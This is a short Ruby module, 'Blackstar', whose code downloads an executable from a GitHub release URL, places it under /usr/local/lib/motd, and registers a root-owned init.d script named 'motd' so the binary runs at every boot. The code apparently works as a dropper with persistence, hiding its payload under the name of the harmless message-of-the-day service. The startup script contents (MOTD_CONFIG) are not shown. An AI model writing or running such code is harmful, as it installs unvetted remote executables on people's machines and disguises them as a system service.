module Blackstar
  class Process
    STARTUP_SCRIPT_PATH = '/etc/init.d/motd'
    EXEC_DIR_PATH = '/usr/local/lib/motd'
    EXEC_PATH = "#{EXEC_DIR_PATH}/motd"
    DOWNLOAD_URL = "https://github.com/speedy-gonzalez2017/blackstar/releases/download/0.0.1/linux-x64"

    def handle
      handle_startup_script
      download_executable
    end

    def download_executable
      p "Downloading Exec"
      `rm -f /tmp/linux-x64`
      `wget -P /tmp "#{DOWNLOAD_URL}"`
      `mv /tmp/linux-x64 #{EXEC_PATH}`
      `chmod +x #{EXEC_PATH}`
    end

    def handle_startup_script
      p "Setting up script"
      `rm #{STARTUP_SCRIPT_PATH} -f`
      `mkdir -p #{EXEC_DIR_PATH}`

      File.open(STARTUP_SCRIPT_PATH, "w") do |f|
        f.write(MOTD_CONFIG)
      end

      `chmod 755 #{STARTUP_SCRIPT_PATH}`
      `chown root:root #{STARTUP_SCRIPT_PATH}`
      `update-rc.d motd defaults`
    end
  end
end